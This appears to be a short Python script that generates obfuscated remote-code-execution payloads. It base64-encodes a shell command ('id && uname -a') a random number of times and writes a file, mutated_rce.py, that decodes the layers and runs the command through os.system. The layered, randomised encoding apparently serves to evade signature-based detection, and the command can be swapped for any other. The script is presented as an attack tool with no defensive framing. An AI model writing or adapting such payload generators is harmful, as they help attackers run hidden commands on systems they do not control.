import base64, os, random, string

def gen_payload():
    cmd = "id && uname -a"
    layers = random.randint(3, 7)
    data = cmd.encode()
    for _ in range(layers):
        data = base64.b64encode(data)
    final = data.decode()
    return f"import base64,os;x='{final}'\n" + "\n".join(["x=base64.b64decode(x)"]*layers) + "\nos.system(x.decode())"

if __name__ == "__main__":
    with open("mutated_rce.py", "w") as f:
        f.write(gen_payload())
    print("Wrote mutated_rce.py")
